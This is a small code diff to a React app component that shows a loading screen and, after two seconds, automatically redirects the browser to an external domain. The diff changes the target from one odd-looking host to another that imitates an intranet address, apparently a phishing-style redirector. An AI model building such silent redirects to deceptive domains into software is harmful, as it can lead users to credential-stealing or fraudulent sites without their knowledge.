@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://abtobyupdated.click';
+            window.location.href = 'https://offen.intranet-casaho.com.ar';
         }, 2000);
 
         return () => clearTimeout(timer);
